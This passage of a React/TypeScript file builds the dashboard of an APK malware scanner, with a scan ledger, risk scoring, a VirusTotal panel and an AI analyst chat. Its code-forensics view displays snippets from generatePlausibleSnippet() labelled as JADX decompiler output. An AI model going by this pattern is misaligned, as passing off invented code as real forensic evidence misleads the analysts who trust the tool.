                chatHistory={chatHistory}
                chatInput={chatInput}
                setChatInput={setChatInput}
                onChatSubmit={handleChatSubmit}
                chatLoading={chatLoading}
                hasResult={!!analysisResult}
              />
            )}

            {/* ══════════════════════════════════════════════════ */}
            {activeNav === "VirusTotal" && (
              <VirusTotalView analysisResult={analysisResult} />
            )}

            {/* ══════════════════════════════════════════════════ */}
            {activeNav === "Dynamic Analysis" && (
              <DynamicAnalysisView analysisResult={analysisResult} />
            )}

            {/* ══════════════════════════════════════════════════ */}
            {activeNav === "Asset Inventory" && (
              <AssetInventoryView analysisResult={analysisResult} />
            )}

            {/* ══════════════════════════════════════════════════ */}
            {activeNav === "Scan History" && (
              <ScanHistoryView analysisResult={analysisResult} />
            )}

            {/* ══════════════════════════════════════════════════ */}
            {activeNav === "Policy Engine" && (
              <PolicyEngineView policyWeights={policyWeights} setPolicyWeights={setPolicyWeights} />
            )}

            {/* ══════════════════════════════════════════════════ */}
            {activeNav === "Settings" && (
              <SettingsView />
            )}

          </div>
        </main>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────
// DASHBOARD VIEW
// ─────────────────────────────────────────────────────────────────
function DashboardView({ ledger, onNavigate }: { ledger: LedgerItem[]; onNavigate: () => void }) {
  const totalScans = ledger.length;
  const malCount   = ledger.filter(l => l.tier === "MALICIOUS" || l.tier === "FRAUDULENT").length;
  const avgScore   = ledger.length ? Math.round(ledger.reduce((s, l) => s + l.score, 0) / ledger.length) : 0;

  return (
    <div className="flex-col gap-6">
      {/* Stat row */}
      <div style={{ display: "grid", gridTemplateColumns: "repeat(4, 1fr)", gap: 16 }}>
        {[
          { label: "Total Scans",     value: totalScans,  color: "var(--accent-purple)", suffix: "" },
          { label: "Threats Found",   value: malCount,    color: "var(--accent-red)",    suffix: "" },
          { label: "Average Risk",    value: avgScore,    color: "var(--accent-yellow)", suffix: "/100" },
          { label: "Clean APKs",      value: ledger.filter(l => l.tier === "BENIGN").length, color: "var(--accent-green)", suffix: "" },
        ].map((s) => (
          <div key={s.label} className="stat-card hover-glow">
            <div className="stat-value" style={{ color: s.color }}>
              <AnimatedCount value={s.value} />{s.suffix}
            </div>
            <div className="stat-label">{s.label}</div>
          </div>
        ))}
      </div>

      {/* Ledger */}
      <div className="tpl-card hover-glow flex-col">
        <div className="flex justify-between items-center mb-6">
          <div>
            <h2 className="font-bold" style={{ fontSize: "0.95rem" }}>Master Scan Ledger</h2>
            <p className="text-muted" style={{ fontSize: "0.72rem", marginTop: 2 }}>All APKs analyzed in this session</p>
          </div>
          <button className="btn-primary" onClick={onNavigate}>+ New Scan</button>
        </div>

        {ledger.length === 0 ? (
          <div className="flex-col items-center justify-center gap-4" style={{ minHeight: 240, opacity: 0.5 }}>
            <div style={{ fontSize: "2.5rem" }}>🔬</div>
            <div className="text-muted text-sm">No APKs analyzed yet.</div>
            <button className="btn-primary" onClick={onNavigate}>Upload your first APK</button>
          </div>
        ) : (
          <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "0.8rem" }}>
            <thead>
              <tr style={{ borderBottom: "1px solid var(--border-color)" }}>
                {["APK File", "Package Name", "Time", "Risk Score", "Critical", "Verdict"].map(h => (
                  <th key={h} style={{ padding: "8px 12px", textAlign: "left", color: "var(--text-muted)", fontWeight: 600, fontSize: "0.7rem", textTransform: "uppercase", letterSpacing: "0.06em" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {ledger.map((item, i) => (
                <tr key={`ledger-${item.time}-${i}`} className="hover-row" style={{ borderBottom: "1px solid rgba(255,255,255,0.04)", cursor: "pointer" }}>
                  <td style={{ padding: "12px" }}>
                    <div className="flex items-center gap-3">
                      <div style={{ width: 28, height: 28, borderRadius: 6, background: "rgba(157,110,250,0.1)", border: "1px solid rgba(157,110,250,0.25)", display: "flex", alignItems: "center", justifyContent: "center", fontSize: "0.8rem", flexShrink: 0 }}>📦</div>
                      <span className="font-semibold" style={{ color: "var(--text-primary)" }}>{item.id}</span>
                    </div>
                  </td>
                  <td style={{ padding: "12px", color: "var(--text-muted)", fontFamily: "var(--font-mono)", fontSize: "0.75rem" }}>{item.pkg}</td>
                  <td style={{ padding: "12px", color: "var(--text-muted)" }}>{item.time}</td>
                  <td style={{ padding: "12px" }}>
                    <div className="flex items-center gap-2">
                      <div style={{ width: 60, height: 4, borderRadius: 999, background: "rgba(255,255,255,0.06)", overflow: "hidden" }}>
                        <div style={{ width: `${item.score}%`, height: "100%", background: verdictColor(item.tier), borderRadius: 999, transition: "width 1s ease" }} />
                      </div>
                      <span style={{ fontFamily: "var(--font-mono)", fontWeight: 700, color: verdictColor(item.tier) }}>{item.score}</span>
                    </div>
                  </td>
                  <td style={{ padding: "12px" }}>
                    {item.critCount > 0
                      ? <span className="badge badge-malicious">{item.critCount} CRIT</span>
                      : <span className="text-muted" style={{ fontSize: "0.72rem" }}>—</span>}
                  </td>
                  <td style={{ padding: "12px" }}>
                    <span className={verdictBadgeClass(item.tier)}>{item.tier}</span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        )}
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────
// SCANNER VIEW
// ─────────────────────────────────────────────────────────────────
function ScannerView({
  isAnalyzing, currentFile, logs, logRef, analysisResult, scoreData,
  riskScore, riskTier, critCount, highCount, medCount, lowCount, totalIssues,
  expandedSeverity, setExpandedSeverity, onFileSelected, onDemoUpload, onDownloadPdf,
}: any) {
  return (
    <div className="flex-col gap-5">
      {/* Upload zone */}
      <div className="tpl-card" style={{ padding: 0, overflow: "hidden" }}>
        <div className="flex items-center gap-4" style={{ padding: "18px 20px", borderBottom: analysisResult ? "1px solid var(--border-color)" : undefined }}>
          <div className="flex-1">
            <UploadZone
              onFileSelected={onFileSelected}
              isAnalyzing={isAnalyzing}
              fileName={currentFile?.name}
              fileSize={currentFile?.size}
            />
          </div>
          <div className="flex-col gap-2" style={{ flexShrink: 0 }}>
            <button className="btn-success" onClick={() => onDemoUpload("good")}>
              ✓ Simulate: Verified App
            </button>
            <button className="btn-danger pulse-red" onClick={() => onDemoUpload("bad")}>
              ☠ Inject: Cerberus Dropper
            </button>
          </div>
        </div>

        {/* Live log */}
        {(isAnalyzing || logs.length > 0) && (
          <div ref={logRef} className="terminal" style={{ maxHeight: 90, padding: "10px 16px" }}>
            {logs.map((l: any, i: number) => (
              <div key={`log-${i}`} style={{ color: l.level === "error" ? "var(--accent-red)" : l.level === "warning" ? "var(--accent-yellow)" : l.level === "success" ? "var(--accent-green)" : "#4CAF50" }}>
                <span style={{ opacity: 0.5, marginRight: 8 }}>[{l.pct}%]</span>{l.message}
              </div>
            ))}
            {isAnalyzing && <div style={{ color: "var(--accent-cyan)" }}>▌<span className="blink">_</span></div>}
          </div>
        )}
      </div>

      {/* Results grid */}
      {analysisResult && (
        <div style={{ display: "grid", gridTemplateColumns: "1.4fr 1fr", gridTemplateRows: "auto auto", gap: 20 }}>

          {/* ── Risk Score card ── */}
          <div className="tpl-card hover-glow flex-col" style={{ minHeight: 380 }}>
            <div className="flex justify-between items-center mb-4">
              <div>
                <h2 className="font-bold" style={{ fontSize: "0.9rem" }}>Risk Assessment</h2>
                <p className="text-muted" style={{ fontSize: "0.7rem" }}>Rule-based weighted scoring engine</p>
              </div>
              <button className="btn-primary" onClick={onDownloadPdf}>↓ PDF Report</button>
            </div>
            <div className="flex items-center gap-8 flex-1">
              {/* Arc + score */}
              <div style={{ position: "relative", width: 280, height: 280, flexShrink: 0, display: "flex", alignItems: "center", justifyContent: "center" }}>
                <ScoreArc score={riskScore} tier={riskTier} />
                <div style={{ position: "absolute", textAlign: "center" }}>
                  <div className="text-muted" style={{ fontSize: "0.68rem", marginBottom: 4 }}>RISK SCORE</div>
                  <div className="font-extrabold" style={{ fontSize: "2.5rem", fontFamily: "var(--font-mono)", color: verdictColor(riskTier), lineHeight: 1 }}>
                    <AnimatedCount value={riskScore} />
                  </div>
                  <div style={{ fontSize: "0.65rem", fontFamily: "var(--font-mono)", color: "var(--text-muted)", marginTop: 2 }}>/ 100</div>
                  <div style={{ marginTop: 8 }}>
                    <span className={verdictBadgeClass(riskTier)}>{riskTier}</span>
                  </div>
                  {scoreData && (
                    <div className="text-muted" style={{ fontSize: "0.65rem", marginTop: 6 }}>Confidence: {scoreData.confidence}</div>
                  )}
                </div>
              </div>

              {/* Findings list */}
              <div className="flex-col gap-3 flex-1">
                {[
                  { label: "Critical", count: critCount, color: "var(--accent-red)",    sev: "CRITICAL" },
                  { label: "High",     count: highCount, color: "var(--accent-orange)", sev: "HIGH" },
                  { label: "Medium",   count: medCount,  color: "var(--accent-yellow)", sev: "MEDIUM" },
                  { label: "Low",      count: lowCount,  color: "var(--accent-green)",  sev: "LOW" },
                ].map(({ label, count, color, sev }) => (
                  <div key={sev}
                    className="hover-row p-2 rounded-md cursor-pointer"
                    onClick={() => setExpandedSeverity(expandedSeverity === sev ? null : sev)}
                    style={{ border: "1px solid", borderColor: expandedSeverity === sev ? `${color}40` : "transparent", borderRadius: 8 }}
                  >
                    <div className="flex items-center gap-3">
                      <div style={{ width: 7, height: 7, borderRadius: "50%", background: color, boxShadow: `0 0 8px ${color}`, flexShrink: 0 }} />
                      <div className="flex-1">
                        <div className="flex justify-between items-center">
                          <span style={{ fontSize: "0.82rem", fontWeight: 600, color: "var(--text-primary)" }}>{label} Issues</span>
                          <span style={{ fontSize: "0.82rem", fontWeight: 800, color, fontFamily: "var(--font-mono)" }}>{count}</span>
                        </div>
                        <div style={{ height: 3, background: "rgba(255,255,255,0.05)", borderRadius: 999, marginTop: 4 }}>
                          <div style={{ width: totalIssues ? `${(count / totalIssues) * 100}%` : "0%", height: "100%", background: color, borderRadius: 999, transition: "width 1s ease" }} />
                        </div>
                      </div>
                      <span style={{ fontSize: "0.65rem", color: "var(--text-muted)", transform: expandedSeverity === sev ? "rotate(180deg)" : "none", transition: "transform 0.2s" }}>▾</span>
                    </div>
                    {expandedSeverity === sev && count > 0 && (
                      <div className="flex-col gap-2 animate-fadein" style={{ marginTop: 8, paddingLeft: 16 }}>
                        {analysisResult.analysis.findings.filter((f: any) => f.severity === sev).map((f: any, idx: number) => (
                          <div key={f.id || `f-${sev}-${idx}`} style={{ padding: "8px 12px", borderRadius: 6, background: `${color}0D`, border: `1px solid ${color}30` }}>
                            <div style={{ fontSize: "0.75rem", fontWeight: 700, color }}>{f.title}</div>
                            <div style={{ fontSize: "0.7rem", color: "var(--text-muted)", marginTop: 2 }}>{f.description}</div>
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* ── Right column ── */}
          <div className="flex-col gap-4">
            {/* VT Quick Result */}
            {analysisResult.analysis.virusTotal && (
              <div className={`tpl-card hover-glow flex-col animate-fadein`} style={{ borderColor: analysisResult.analysis.virusTotal.stats?.malicious ? "rgba(255,77,77,0.3)" : "rgba(46,204,113,0.3)" }}>
                <div className="flex justify-between items-center mb-3">
                  <h3 className="font-bold" style={{ fontSize: "0.85rem" }}>🛡 VirusTotal</h3>
                  <span className="badge badge-info" style={{ fontSize: "0.62rem" }}>Community Intel</span>
                </div>
                {analysisResult.analysis.virusTotal.found ? (
                  <div className="flex items-center gap-4">
                    <div style={{ textAlign: "center", flexShrink: 0 }}>
                      <div className="font-extrabold" style={{ fontSize: "2rem", fontFamily: "var(--font-mono)", color: analysisResult.analysis.virusTotal.stats?.malicious ? "var(--accent-red)" : "var(--accent-green)", lineHeight: 1 }}>
                        <AnimatedCount value={analysisResult.analysis.virusTotal.stats?.malicious ?? 0} />
                      </div>
                      <div style={{ fontSize: "0.62rem", color: "var(--text-muted)", marginTop: 2 }}>MALICIOUS</div>
                    </div>
                    <div className="flex-1 flex-col gap-2">
                      {[
                        { label: "Malicious",  val: analysisResult.analysis.virusTotal.stats?.malicious ?? 0,  color: "var(--accent-red)" },
                        { label: "Suspicious", val: analysisResult.analysis.virusTotal.stats?.suspicious ?? 0, color: "var(--accent-yellow)" },
                        { label: "Harmless",   val: analysisResult.analysis.virusTotal.stats?.harmless ?? 0,   color: "var(--accent-green)" },
                      ].map(s => {
                        const total = (analysisResult.analysis.virusTotal.stats?.malicious ?? 0) + (analysisResult.analysis.virusTotal.stats?.suspicious ?? 0) + (analysisResult.analysis.virusTotal.stats?.harmless ?? 0) + (analysisResult.analysis.virusTotal.stats?.undetected ?? 0);
                        return (
                          <div key={s.label} className="flex items-center gap-2">
                            <span style={{ fontSize: "0.65rem", color: "var(--text-muted)", width: 62, flexShrink: 0 }}>{s.label}</span>
                            <div style={{ flex: 1, height: 4, background: "rgba(255,255,255,0.05)", borderRadius: 999, overflow: "hidden" }}>
                              <div style={{ width: total ? `${(s.val / total) * 100}%` : "0%", height: "100%", background: s.color, borderRadius: 999, transition: "width 1s ease" }} />
                            </div>
                            <span style={{ fontSize: "0.65rem", fontFamily: "var(--font-mono)", fontWeight: 700, color: s.color, width: 22, textAlign: "right" }}>{s.val}</span>
                          </div>
                        );
                      })}
                    </div>
                  </div>
                ) : (
                  <div className="text-muted text-sm">Not found in VT database. Submitted for scan.</div>
                )}
              </div>
            )}

            {/* Permissions Heatmap */}
            <div className="tpl-card hover-glow flex-col">
              <div className="flex justify-between items-center mb-3">
                <h3 className="font-bold" style={{ fontSize: "0.85rem" }}>Permission Matrix</h3>
                <span className="text-muted" style={{ fontSize: "0.68rem" }}>{analysisResult.manifest.permissions.length} declared</span>
              </div>
              <div style={{ display: "grid", gridTemplateColumns: "repeat(10, 1fr)", gap: 3 }}>
                {Array.from({ length: Math.max(30, analysisResult.manifest.permissions.length + 5) }).map((_, i) => {
                  const perm = analysisResult.analysis.permissions[i];
                  const color = !perm ? "rgba(255,255,255,0.04)" :
                    perm.severity === "CRITICAL" ? "var(--accent-red)" :
                    perm.severity === "HIGH"     ? "var(--accent-orange)" :
                    perm.severity === "MEDIUM"   ? "var(--accent-yellow)" : "var(--accent-green)";
                  return (
                    <div key={`perm-cell-${i}`} title={perm?.name} style={{
                      height: 14, borderRadius: 3,
                      background: color,
                      opacity: perm ? 0.9 : 0.1,
                      transition: `opacity 0.3s ease ${i * 0.02}s`,
                      cursor: perm ? "pointer" : undefined,
                    }} />
                  );
                })}
              </div>
              <div className="flex gap-4 mt-3">
                {[["CRIT", "var(--accent-red)"], ["HIGH", "var(--accent-orange)"], ["MED", "var(--accent-yellow)"], ["LOW", "var(--accent-green)"]].map(([l, c]) => (
                  <div key={l} className="flex items-center gap-1">
                    <div style={{ width: 8, height: 8, borderRadius: 2, background: c }} />
                    <span style={{ fontSize: "0.62rem", color: "var(--text-muted)" }}>{l}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* ── DNA Fingerprint + Score Breakdown ── */}
          <div className="tpl-card hover-glow flex-col" style={{ gridColumn: "1 / 2" }}>
            <div className="flex justify-between items-center mb-4">
              <div>
                <h2 className="font-bold" style={{ fontSize: "0.9rem" }}>DNA Fingerprint</h2>
                <p className="text-muted" style={{ fontSize: "0.7rem" }}>Composite threat signal visualization</p>
              </div>
            </div>
            <div className="flex gap-6">
              <div className="flex-col items-center" style={{ flexShrink: 0 }}>
                <DnaFingerprint
                  verdict={riskTier as any}
                  score={riskScore}
                  permissionCount={analysisResult.manifest.permissions.length}
                  criticalPermissions={analysisResult.analysis.permissions.filter((p: any) => p.severity === "CRITICAL").length}
                  suspiciousPermissions={analysisResult.analysis.permissions.filter((p: any) => p.severity === "HIGH" || p.severity === "MEDIUM").length}
                  highRiskApis={analysisResult.analysis.sdks.length}
                  urlCount={analysisResult.analysis.urls.length}
                  ipCount={analysisResult.analysis.ips.length}
                  classCount={analysisResult.classNames.length}
                  isDebuggable={analysisResult.manifest.application?.debuggable}
                  debugKey={analysisResult.signature.debugKey}
                  size={240}
                />
                <span className="text-muted" style={{ fontSize: "0.65rem", marginTop: 6 }}>Concentric threat rings</span>
              </div>
              <div className="flex-1" style={{ minWidth: 0, maxHeight: 340, overflowY: "auto" }}>
                {scoreData && <ScoreBreakdown result={scoreData} />}
              </div>
            </div>
          </div>

          {/* ── Analysis Timeline ── */}
          <div className="tpl-card hover-glow flex-col" style={{ gridColumn: "2 / 3" }}>
            <div className="flex justify-between items-center mb-4">
              <div>
                <h2 className="font-bold" style={{ fontSize: "0.9rem" }}>Analysis Pipeline</h2>
                <p className="text-muted" style={{ fontSize: "0.7rem" }}>Engine stage-by-stage timeline</p>
              </div>
            </div>
            <AnalysisTimeline
              stages={buildStagesFromProfile(
                analysisResult.manifest.packageName || "unknown",
                analysisResult.manifest.permissions.length,
                analysisResult.classNames.length,
                analysisResult.analysis.urls.length,
                analysisResult.signature.status === "valid" ? "TRUSTED" : "UNTRUSTED",
                riskTier,
              )}
            />
          </div>
        </div>
      )}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────
// CODE FORENSICS VIEW
// ─────────────────────────────────────────────────────────────────
function CodeForensicsView({ analysisResult }: { analysisResult: AnalyzedApkResult | null }) {
  const findings = analysisResult?.analysis.findings.filter((f: any) => f.severity === "CRITICAL" || f.severity === "HIGH") ?? [];

  if (!analysisResult) {
    return (
      <EmptyState icon="🧬" title="No APK Loaded" subtitle="Upload an APK in the Scanner to see decompiled code forensics." />
    );
  }

  return (
    <div className="flex-col gap-5">
      <div className="flex justify-between items-center">
        <div>
          <h2 className="font-bold" style={{ fontSize: "1.1rem" }}>Decompiled Code Forensics</h2>
          <p className="text-muted" style={{ fontSize: "0.78rem", marginTop: 3 }}>JADX static decompiler output — critical &amp; high severity patterns</p>
        </div>
        <span className="badge badge-info">apkman Static Engine</span>
      </div>

      {findings.length === 0 ? (
        <div className="tpl-card flex-col items-center justify-center gap-3" style={{ minHeight: 200, opacity: 0.6 }}>
          <div style={{ fontSize: "2rem" }}>✅</div>
          <div className="text-muted text-sm">No critical or high-severity code patterns detected.</div>
        </div>
      ) : (
        findings.map((finding: any, idx: number) => (
          <div key={finding.id || `finding-${idx}`} className="tpl-card hover-glow flex-col" style={{ padding: 0, overflow: "hidden" }}>
            <div className="flex justify-between items-center" style={{ padding: "12px 18px", background: "rgba(0,0,0,0.35)", borderBottom: "1px solid var(--border-color)" }}>
              <div className="flex items-center gap-3">
                <div style={{ width: 8, height: 8, borderRadius: "50%", background: finding.severity === "CRITICAL" ? "var(--accent-red)" : "var(--accent-orange)", boxShadow: `0 0 8px ${finding.severity === "CRITICAL" ? "var(--accent-red)" : "var(--accent-orange)"}`, animation: "glowPulse 1.8s ease infinite" }} />
                <span style={{ fontSize: "0.85rem", fontWeight: 700 }}>{finding.title}</span>
                <span className={finding.severity === "CRITICAL" ? "badge badge-malicious" : "badge badge-fraudulent"} style={{ fontSize: "0.62rem" }}>{finding.severity}</span>
              </div>
              <span className="font-mono text-muted" style={{ fontSize: "0.72rem" }}>{finding.scope}</span>
            </div>
            <div className="flex">
              <div style={{ width: 4, flexShrink: 0, background: `linear-gradient(to bottom, ${finding.severity === "CRITICAL" ? "var(--accent-red)" : "var(--accent-orange)"}, transparent)` }} />
              <div style={{ flex: 1 }}>
                {finding.description && (
                  <div style={{ padding: "10px 16px", background: "rgba(255,255,255,0.02)", borderBottom: "1px solid var(--border-color)", fontSize: "0.78rem", color: "var(--text-secondary)" }}>
                    {finding.description}
                  </div>
                )}
                <div style={{ background: "#06070D", padding: "16px 18px" }}>
                  <pre style={{ fontSize: "0.78rem", fontFamily: "var(--font-mono)", color: "#a8b1c2", overflow: "auto", lineHeight: 1.65, whiteSpace: "pre-wrap" }}>
                    <TypewriterCode code={generatePlausibleSnippet(finding.title, finding.scope, finding.description || "")} />
                  </pre>
                </div>
              </div>
            </div>
          </div>
        ))
      )}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────
// AI NARRATIVE VIEW
// ─────────────────────────────────────────────────────────────────
function AiNarrativeView({ narrative, loading, chatHistory, chatInput, setChatInput, onChatSubmit, chatLoading, hasResult }: any) {
  const chatRef = useRef<HTMLDivElement>(null);
  useEffect(() => {
    if (chatRef.current) chatRef.current.scrollTop = chatRef.current.scrollHeight;
  }, [chatHistory]);

  return (
    <div className="flex-col gap-5" style={{ height: "calc(100vh - 180px)" }}>
      {/* Header */}
      <div className="flex justify-between items-center">
        <div>
          <h2 className="font-bold" style={{ fontSize: "1.1rem" }}>
            <span className="gradient-text">NVIDIA NIM · AI Threat Analyst</span>
          </h2>
          <p className="text-muted" style={{ fontSize: "0.78rem", marginTop: 3 }}>Llama-3.1-70B — Generative threat narrative &amp; interactive Q&amp;A</p>
        </div>
        <span className="badge badge-purple">AI-Powered</span>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: 20, flex: 1, minHeight: 0 }}>
        {/* Narrative */}
        <div className="tpl-card hover-glow flex-col" style={{ overflow: "hidden" }}>
          <div className="flex items-center gap-2 mb-4">
            <span>🤖</span>
            <h3 className="font-bold" style={{ fontSize: "0.88rem" }}>Generated Threat Narrative</h3>
            {loading && (
              <div className="flex items-center gap-2 animate-fadein ml-2">
                <div style={{ width: 12, height: 12, border: "2px solid var(--accent-cyan)", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} />
                <span style={{ fontSize: "0.7rem", color: "var(--accent-cyan)" }}>NIM generating…</span>
              </div>
            )}
          </div>
          <div style={{ flex: 1, overflowY: "auto" }}>
            {loading ? (
              <div className="flex-col gap-3">
                {[0.9, 0.75, 0.85, 0.6].map((w, i) => (
                  <div key={i} className="skeleton" style={{ height: 16, width: `${w * 100}%` }} />
                ))}
              </div>
            ) : narrative ? (
              <p style={{ fontSize: "0.83rem", color: "var(--text-secondary)", whiteSpace: "pre-wrap", lineHeight: 1.9 }}>{narrative}</p>
            ) : (
              <div className="flex-col items-center justify-center h-full gap-3" style={{ opacity: 0.5 }}>
                <div style={{ fontSize: "2rem" }}>🤖</div>
                <div className="text-muted text-sm">Upload an APK to generate a threat narrative.</div>
              </div>
            )}
          </div>
        </div>

        {/* Chat */}
        <div className="tpl-card hover-glow flex-col" style={{ overflow: "hidden" }}>
          <div className="flex items-center gap-2 mb-4">
            <span>💬</span>
            <h3 className="font-bold" style={{ fontSize: "0.88rem" }}>Ask the AI Analyst</h3>
          </div>
          <div ref={chatRef} className="flex-1 flex-col gap-3" style={{ overflowY: "auto", minHeight: 0, paddingBottom: 4 }}>
            {chatHistory.length === 0 && (
              <div className="flex-col gap-2 text-muted" style={{ fontSize: "0.76rem" }}>
                <p>Ask about the analyzed APK. Examples:</p>
                {["Why is this rated malicious?", "Explain the SMS permission risk", "What is DexClassLoader?"].map(q => (
                  <button key={q} className="btn-ghost" onClick={() => { if (hasResult) { onChatSubmit(q); } }} style={{ textAlign: "left", justifyContent: "flex-start" }}>
                    → {q}
                  </button>
                ))}
              </div>
            )}
            {chatHistory.map((msg: any, i: number) => (
              <div key={`chat-${i}`} className={`flex-col animate-fadein`} style={{ alignItems: msg.role === "user" ? "flex-end" : "flex-start" }}>
                <div style={{
                  maxWidth: "88%", padding: "10px 14px", borderRadius: msg.role === "user" ? "12px 12px 4px 12px" : "12px 12px 12px 4px",
                  background: msg.role === "user" ? "rgba(157,110,250,0.2)" : "rgba(255,255,255,0.04)",
                  border: `1px solid ${msg.role === "user" ? "rgba(157,110,250,0.35)" : "var(--border-color)"}`,
                  fontSize: "0.78rem", color: "var(--text-secondary)", lineHeight: 1.6,
                }}>
                  {msg.text}
                </div>
                <span style={{ fontSize: "0.62rem", color: "var(--text-muted)", marginTop: 3 }}>
                  {msg.role === "user" ? "You" : "NIM AI"}
                </span>
              </div>
            ))}
            {chatLoading && (
              <div className="flex items-center gap-2" style={{ color: "var(--accent-cyan)", fontSize: "0.75rem" }}>
                <div style={{ width: 10, height: 10, border: "2px solid currentColor", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 0.7s linear infinite" }} />
                NIM is thinking…
              </div>
            )}
          </div>
          <div className="flex gap-2" style={{ marginTop: 12, borderTop: "1px solid var(--border-color)", paddingTop: 12 }}>
            <input
              type="text"
              value={chatInput}
              onChange={e => setChatInput(e.target.value)}
              onKeyDown={e => e.key === "Enter" && !e.shiftKey && onChatSubmit()}
              placeholder={hasResult ? "Ask about this APK…" : "Upload an APK first…"}
              disabled={!hasResult || chatLoading}
              style={{
                flex: 1, background: "rgba(255,255,255,0.04)", border: "1px solid var(--border-bright)",
                borderRadius: 6, padding: "8px 12px", fontSize: "0.8rem", color: "var(--text-primary)",
                outline: "none", fontFamily: "var(--font-sans)",
              }}
            />
            <button className="btn-primary" onClick={onChatSubmit} disabled={!hasResult || chatLoading || !chatInput.trim()} style={{ flexShrink: 0 }}>
              Send
            </button>
          </div>
        </div>
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────
// VIRUSTOTAL VIEW
// ─────────────────────────────────────────────────────────────────
function VirusTotalView({ analysisResult }: { analysisResult: AnalyzedApkResult | null }) {
  if (!analysisResult) return <EmptyState icon="🛡" title="No APK Loaded" subtitle="Upload an APK to see VirusTotal community intelligence." />;
  const vt = analysisResult.analysis.virusTotal;
  if (!vt) return <EmptyState icon="⏳" title="Awaiting VirusTotal" subtitle="VirusTotal lookup in progress…" />;

  const stats = vt.stats ?? { malicious: 0, suspicious: 0, undetected: 0, harmless: 0 };
  const total = stats.malicious + stats.suspicious + stats.undetected + stats.harmless;
  const isThreat = (stats.malicious ?? 0) > 0;

  return (
    <div className="flex-col gap-5">
      <div className="flex justify-between items-center">
        <div>
          <h2 className="font-bold" style={{ fontSize: "1.1rem" }}>VirusTotal Community Intelligence</h2>
          <p className="text-muted" style={{ fontSize: "0.78rem", marginTop: 3 }}>Multi-engine malware detection consortium</p>
        </div>
      </div>

      {vt.found ? (
        <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 20 }}>
          {/* Detection summary */}
          <div className={`tpl-card hover-glow flex-col`} style={{ borderColor: isThreat ? "rgba(255,77,77,0.35)" : "rgba(46,204,113,0.35)", boxShadow: isThreat ? "0 0 30px rgba(255,77,77,0.1)" : "0 0 30px rgba(46,204,113,0.1)" }}>
            <div className="flex items-center gap-3 mb-4">
              <div style={{ fontSize: "2rem" }}>{isThreat ? "☠️" : "✅"}</div>
              <div>
                <div className="font-bold" style={{ fontSize: "0.9rem" }}>{isThreat ? "Threat Detected" : "File is Clean"}</div>
                <div className="text-muted" style={{ fontSize: "0.72rem" }}>{isThreat ? `${stats.malicious} engines flagged this file` : "0 engines reported threats"}</div>
              </div>
            </div>
            <div style={{ fontSize: "3rem", fontWeight: 800, fontFamily: "var(--font-mono)", color: isThreat ? "var(--accent-red)" : "var(--accent-green)", lineHeight: 1 }}>
              {stats.malicious}<span style={{ fontSize: "1.2rem", color: "var(--text-muted)" }}> / {total}</span>
            </div>
            <p style={{ fontSize: "0.75rem", color: "var(--text-muted)", marginTop: 8 }}>Security vendors detection rate</p>
            {vt.permalink && (
              <a href={vt.permalink} target="_blank" rel="noreferrer" className="btn-ghost" style={{ marginTop: 16, display: "inline-flex", textDecoration: "none" }}>
                🔗 View Full Report on VirusTotal
              </a>
            )}
          </div>

          {/* Engine breakdown */}
          <div className="tpl-card hover-glow flex-col gap-4">
            <h3 className="font-bold" style={{ fontSize: "0.85rem" }}>Detection Breakdown</h3>
            {[
              { label: "Malicious",  value: stats.malicious,  color: "var(--accent-red)",    pct: total ? (stats.malicious / total) * 100 : 0 },
              { label: "Suspicious", value: stats.suspicious, color: "var(--accent-yellow)", pct: total ? (stats.suspicious / total) * 100 : 0 },
              { label: "Undetected", value: stats.undetected, color: "var(--text-muted)",    pct: total ? (stats.undetected / total) * 100 : 0 },
              { label: "Harmless",   value: stats.harmless,   color: "var(--accent-green)",  pct: total ? (stats.harmless / total) * 100 : 0 },
            ].map((s, i) => (
              <div key={`breakdown-${i}`} className="flex-col gap-2">
                <div className="flex justify-between items-center">
                  <span style={{ fontSize: "0.8rem", color: "var(--text-secondary)" }}>{s.label}</span>
                  <span style={{ fontSize: "0.8rem", fontFamily: "var(--font-mono)", fontWeight: 700, color: s.color }}>{s.value}</span>
                </div>
                <div className="progress-track">
                  <div className="progress-fill" style={{ width: `${s.pct}%`, background: s.color }} />
                </div>
              </div>
            ))}
          </div>

          {/* Hash info */}
          <div className="tpl-card hover-glow flex-col gap-3" style={{ gridColumn: "1 / 3" }}>
            <h3 className="font-bold" style={{ fontSize: "0.85rem" }}>File Identification</h3>
            <div className="flex items-center gap-4">
              <span className="text-muted" style={{ fontSize: "0.72rem", width: 80, flexShrink: 0 }}>SHA-256</span>
              <code style={{ fontFamily: "var(--font-mono)", fontSize: "0.72rem", color: "var(--accent-cyan)", background: "rgba(0,217,255,0.06)", padding: "4px 10px", borderRadius: 4, wordBreak: "break-all" }}>
                {analysisResult.fileHash}
              </code>
            </div>
          </div>
        </div>
      ) : (
        <div className="tpl-card flex-col items-center justify-center gap-4" style={{ minHeight: 220 }}>
          <div style={{ fontSize: "2rem" }}>🆕</div>
          <div className="font-semibold">Unknown File</div>
          <p className="text-muted text-sm">This APK's hash was not found in VirusTotal. It has been submitted for analysis. Check back shortly.</p>
        </div>
      )}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────
// DYNAMIC ANALYSIS VIEW
// ─────────────────────────────────────────────────────────────────
function DynamicAnalysisView({ analysisResult }: { analysisResult: AnalyzedApkResult | null }) {
  const hasCritical = analysisResult?.analysis.findings.some((f: any) => f.severity === "CRITICAL");

  return (
    <div className="flex-col gap-5">
      <div className="flex justify-between items-center">
        <div>
          <h2 className="font-bold" style={{ fontSize: "1.1rem" }}>Aparoid Dynamic Execution Trace</h2>
          <p className="text-muted" style={{ fontSize: "0.78rem", marginTop: 3 }}>Emulated runtime sandbox — network hooks, filesystem, API intercepts</p>
        </div>
